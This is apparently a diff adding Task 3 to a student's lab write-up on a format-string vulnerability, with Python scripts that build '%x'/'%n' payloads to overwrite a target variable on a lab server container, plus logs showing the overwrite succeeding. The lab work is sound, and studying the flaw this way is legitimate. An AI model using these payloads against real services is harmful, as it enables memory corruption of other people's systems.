@@ -129,4 +129,91 @@ server-10.9.0.5 | The target variable's value (after):  0x11223344
 server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
 ```
 
+## Task 3: Modifying the Server Program’s Memory
+
+### Task 3.A: Change the value to a different value
+
+- build_string.py
+```python
+#!/usr/bin/python3
+import sys
+
+NUM_FORMAT_SPECIFIERS = 63
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+number  = 0x080e5068
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+s = "%x"*NUM_FORMAT_SPECIFIERS + "\n%n"
+
+fmt  = (s).encode('latin-1')
+content[4:4+len(fmt)] = fmt
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+- Printout do container:
+```
+server-10.9.0.5 | Got a connection from 10.9.0.1
+server-10.9.0.5 | Starting format
+server-10.9.0.5 | The input buffer's address:    0xffffd210
+server-10.9.0.5 | The secret message's address:  0x080b4008
+server-10.9.0.5 | The target variable's address: 0x080e5068
+server-10.9.0.5 | Waiting for user input ......
+server-10.9.0.5 | Received 1500 bytes.
+server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd138
+server-10.9.0.5 | The target variable's value (before): 0x11223344
+server-10.9.0.5 | h1122334410008049db580e532080e61c0ffffd210ffffd13880e62d480e5000ffffd1d88049f7effffd2100648049f4780e53205dc5dcffffd210ffffd21080e97200000000000000000000000000bade210080e500080e5000ffffd7f88049effffffd2105dc5dc80e5320000ffffd8c40005dc
+server-10.9.0.5 | The target variable's value (after):  0x000000ed
+server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+```
+
+### Task 3.B: Change the value to 0x5000
+
+- build_string.py
+```python
+#!/usr/bin/python3
+import sys
+
+NUM_FORMAT_SPECIFIERS = 62
+
+# Initialize the content array
+N = 1500
+content = bytearray(0x0 for i in range(N))
+
+number  = 0x080e5068
+content[0:4]  =  (number).to_bytes(4,byteorder='little')
+
+s = "%.330x"*NUM_FORMAT_SPECIFIERS + "%.16x%n"
+
+fmt  = (s).encode('latin-1')
+content[4:4+len(fmt)] = fmt
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+- Printout do container:
+```
+server-10.9.0.5 | The target variable's value (after):  0x00005001
+server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+server-10.9.0.5 | Got a connection from 10.9.0.1
+server-10.9.0.5 | Starting format
+server-10.9.0.5 | The input buffer's address:    0xffffd210
+server-10.9.0.5 | The secret message's address:  0x080b4008
+server-10.9.0.5 | The target variable's address: 0x080e5068
+server-10.9.0.5 | Waiting for user input ......
+server-10.9.0.5 | Received 1500 bytes.
+server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd138
+server-10.9.0.5 | The target variable's value (before): 0x11223344
+server-10.9.0.5 | (...) The target variable's value (after):  0x00005000
+server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
+```
+
 # CTF
